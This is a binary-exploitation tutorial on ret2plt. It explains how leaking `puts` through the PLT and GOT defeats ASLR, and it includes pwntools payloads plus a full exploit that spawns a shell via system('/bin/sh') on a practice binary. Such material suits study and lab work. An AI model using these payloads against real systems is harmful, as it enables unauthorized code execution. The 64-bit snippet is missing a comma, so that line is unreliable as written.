# Ret2plt

## Basic Information

The goal of this technique would be to **leak an address from a function from the PLT** to be able to bypass ASLR. This is because if, for example, you leak the address of the function `puts` from the libc, you can then **calculate where is the base of `libc`** and calculate offsets to access other functions such as **`system`**.

This can be done with a `pwntools` payload such as ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):

```python
# 32-bit ret2plt
payload = flat(
    b'A' * padding,
    elf.plt['puts'],
    elf.symbols['main'],
    elf.got['puts']
)

# 64-bit
payload = flat(
    b'A' * padding,
    POP_RDI,
    elf.got['puts']
    elf.plt['puts'],
    elf.symbols['main']
)
```

Note how **`puts`** (using the address from the PLT) is called with the address of `puts` located in the GOT (Global Offset Table). This is because by the time `puts` prints the GOT entry of `puts`, this **entry will contain the exact address of `puts` in memory**.

Also note how the address of `main` is used in the exploit so when `puts` ends its execution, the **binary calls `main` again instead of exiting** (so the leaked address will continue to be valid).

> [!CAUTION]
> Note how in order for this to work the **binary cannot be compiled with PIE** or you must have **found a leak to bypass PIE** in order to know the address of the PLT, GOT and `main`. Otherwise, you need to bypass PIE first.

You can find a [**full example of this bypass here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). This was the final exploit from that example:

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
    'A' * 32,
    elf.plt['puts'],
    elf.sym['main'],
    elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
    'A' * 32,
    libc.sym['system'],
    libc.sym['exit'],
    next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```

  - 64 bit, ASLR enabled but no PIE, the first step is to fill an overflow until the byte 0x00 of the canary to then call puts and leak it. With the canary a ROP gadget is created to call puts to leak the address of puts from the GOT and the a ROP gadget to call `system('/bin/sh')`
